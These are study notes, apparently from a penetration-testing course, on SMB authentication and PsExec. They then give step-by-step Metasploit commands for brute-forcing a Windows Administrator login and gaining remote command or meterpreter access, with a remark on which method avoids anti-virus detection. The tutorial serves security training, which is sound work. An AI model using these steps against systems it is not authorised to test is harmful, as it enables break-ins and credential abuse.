# SMB (Server Message Block)
* It is a network file sharing protocol--> used to facilitate sharing of files and peripherals (printers and serial ports) between computers on a local network (LAN).
* SMB uses port 445 on TCP. Originally SMB ran on top of NETBIOS using port 139.
* Authentication might be configured.
* **SAMBA** is the open source Linux implementation of SMB, and allows Windows systems to access Linux shares and devices.
* Windows --> SMB  ~~~  Linux --> Samba

## SMB Authentication
 1. User AUthentication
 2. Share Authentication

### 1. User AUthentication
* A username and password is required to access a share.

### 2. Share Authentication
* Just a password is required to access share.


**Both of these authentication levels utilize a CHALLENGE RESPONSE AUTHENTICATION SYSTEM.**

## How SMB Authentication works
* Client ---> Authentication Request
* Server ---> Encrypted string with User's hash
* Client ---> Encrypted string
* Server ---> Hash compared and access grant decided

# PsExec
* It is a lightweight telnet replacement developed by Microsoft.
* **USE**:
    * Allows to execute processes on remtoe windows system suing any user's credentials.
    * PsExec utility is used to authenticate with the target system legitimately and run arbitrary commands or launch a remote command prompt
* PsExec authentication is performed via SMB.
* PsExec is similar to RDP but instead of controlling the remote system via GUI, commands are sent through CMD.

## How SMB exploitation works
* To utilize PsExec to exploit SMB, we need to know the credentials. The ways to get those credentials:
   * **Brute force attack**
     * We can narrow down to only include common Windows user accounts like "Administrator". Any Windows system will have multiple users but one thing constant in Windows system is "Administrator" account.
     * **How to launch a Brute force attack**
       * `service postgresql start && msfconsole` ---> PostgreSQL service is required to be started as Metasploit framework console utilizes a database that is configured to run with PostgreSQL.
       * `use auxiliary/scanner/smb/smb_login` ---> `options`
       * Inside the options, we can specify "SMBDomain", if the target system is the part of a domain.
       * As we are going to perform a brute force attack, USER_FILE and PASS_FILE options need to be specified.
       * `run`
      
   * **Using PsExec**
     * PsExec is a Windows utility, which can run on Linux using WINE, but I will do it using the python script "psexec.py"
     * `psexec.py [username from the brute force attack]@[target IP] cmd.exe`
     * If we can get the credentials with the brute force in the previous step, then this is a safer method to get access to the target system as it does not execute a payload on the target.
 
    * **To get a meterpreter session on the target system**
     *  `use windows/smb/psexec` ---> This exploit will execute a meterpreter payload on the target system and provides us with a meterpreter session.
     *  As it runs a malicious payload on the target, it can be detected by the anti-virus software installed on the target, hence less safer than psexec.py.
     * `set rhosts` and `set smbuser [username from brute force attack]` and `set smbpass [password]`, Also check if LHOST is set to the local IP address.
     * `exploit`
       
